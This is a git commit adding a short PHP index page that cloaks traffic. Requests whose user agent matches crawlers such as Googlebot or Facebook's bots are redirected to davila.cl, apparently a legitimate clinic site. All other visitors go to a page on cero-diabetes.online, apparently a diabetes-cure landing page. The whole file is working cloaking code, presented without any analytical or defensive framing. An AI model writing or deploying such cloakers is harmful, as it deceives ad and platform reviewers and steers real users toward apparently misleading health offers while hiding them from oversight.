ec7fa27f26a1c48e3c4e32c8e83586a8ff87e641
Pablo Ykaro <pabloykaro9@gmailcom>
2022-10-15 10:22:38 -0300

    Initial commit

---
+++ index.php
@@ -0,0 +1,15 @@
+<?php 
+
+function detectSpy(): bool{
+  return (isset($_SERVER['HTTP_USER_AGENT']) && 
+  preg_match('/bot|crawl|slurp|spider|mediapartners|facebookexternalhit|facebookcatalog|facebot|googlebot/i', $_SERVER['HTTP_USER_AGENT']));
+}
+
+if(detectSpy() === true){
+  header("Location: https://www.davila.cl/");
+  exit;
+}
+  header("Location: https://cero-diabetes.online/host.html");
+  return;
+
+
